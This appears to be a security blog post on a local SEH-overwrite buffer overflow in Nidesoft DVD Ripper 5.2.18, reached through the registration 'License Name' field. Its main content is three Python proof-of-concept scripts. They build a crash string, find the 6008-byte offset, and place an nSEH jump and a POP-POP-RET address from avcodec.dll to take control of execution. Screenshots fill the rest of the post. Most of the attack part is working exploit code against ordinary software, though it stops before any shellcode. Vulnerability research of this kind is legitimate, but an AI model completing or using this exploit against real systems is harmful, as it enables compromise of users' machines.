---
layout: post
title: Nidesoft DVD Ripper - 5.2.18 Local Buffer Overflow
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# The Bug 

### DVD Ripper version 5.2.18 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter "License Name" within the registration in the bootup.

### Initial PoC:

```term
import struct

buffer = "A" * 7000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### The exploit is generated

![](/assets/img/Findings10/1.png)

### The exploit is copied into the clipboard

![](/assets/img/Findings10/2.png)

### The application is launched and the payload is sent through the required parameter.

![](/assets/img/Findings10/3.png)

## Crash I

![](/assets/img/Findings10/4.png)

# Controlling the execution

### Through the use of msf-pattern*, the offset is found to be at 6008.

### PoC

```term
import struct

buffer = "A" * 6008 + "BBBB" + "CCCC" 

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### Crash II

![](/assets/img/Findings10/5.png)

### List of the available modules

![](/assets/img/Findings10/6.png)

### In this case, i chose avcodec.dll, as it possesses a great quantity of POP-POP-RET sequences. In addition, these were found to be alphanumeric as well.

![](/assets/img/Findings10/7.png)

### PoC

```term
import struct

nseh = "\x70\x08\x71\x06"
seh = struct.pack("<I", 0x66784C36)

buffer = "A" * 6008 + nseh + seh + "\xff" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### Crash III

![](/assets/img/Findings10/8.png)
